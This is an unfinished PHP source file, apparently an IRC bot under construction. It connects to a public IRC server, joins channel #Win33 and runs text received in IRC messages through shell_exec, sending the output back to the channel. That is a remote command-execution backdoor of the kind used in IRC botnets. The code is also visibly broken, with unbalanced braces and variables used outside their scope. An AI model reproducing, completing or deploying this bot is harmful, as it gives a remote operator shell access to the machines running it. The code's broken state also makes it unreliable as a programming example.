<?php
//Still far from finished, this is just me slowly trying to bring some order to code,most
// of the functions still need parameters or perhaps I'm going to use global variables.
//Let's define all the functions first.

function KeepRunning() {
	set_time_limit(0); 
	ini_set('display_errors', 'on'); // Get output from stdout
}

function randNick() {

$rand = getrandmax();
$nick = md5($rand);
$better = mt_rand();
$name = sha1($better);
$real = sha1($rand);

}

function connect()
{
	$socket = fsockopen("irc.freenode.net", 6667);
	fputs($socket, "NICK $nick\n"); //Um sorry anapnea, what host could I put here ?
	fputs($socket,"USER $nick bshellz.net $nick :$name $real\n"); //(nick host nick:realname)
	fputs($socket,"JOIN #Win33\n"); // 


}

function connectSSL()
{
	$socket = fsockopen('ssl://' . "irc.freenode.net", 6697);
	fputs($socket, "NICK $nick\n"); //Um sorry bshellz, what host could I put here ?
	fputs($socket,"USER $nick bshellz.net $nick :$name $real\n"); //(nick host nick:realname)
	fputs($socket,"JOIN #Win33\n"); // 


} // Call this function, if it has error connecting perhaps call connect() next.



function serverResponses() {
	while($data = fgets($socket,128)) {
		echo nl2br($data);
		flush();

		// Seperate the strings we receive from the server. Use explode() function for this.
		// Data seperated by explode() function will be saved into an array named $ex
		$ex = explode( ' ' , $data);
}
function pongPings() {
	if($ex[0] == "PING") {
			fputs($socket, "PONG".$ex[1]."\n");
		
}
/*
function runCommands() {
	// Add few less trivial Commands.
	// Add functions for OS detection etc. Look at stuff in parts folder.
	$command = str_replace(array(chr(10), chr(13)), '', $ex[3]);
		if ($command == ":!date") {
			$cmdd = "date";
			$output = exec($cmdd);
			fputs($socket, "PRIVMSG ".$ex[2]."$output\n"); */
function runCommands(String $command) {
	
	$command = str_replace(array(chr(10), chr(13)), '', $ex[3]);
	
			$cmdd = $command;
			$output = shell_exec($cmdd);
			fputs($socket, "PRIVMSG ".$ex[2]."$output\n"); 
}
// Make function take parameters 


}

//After defining function calls the functions.
// Call in right order.
// Put everything from here onward in a never ending while(1) {}




?>
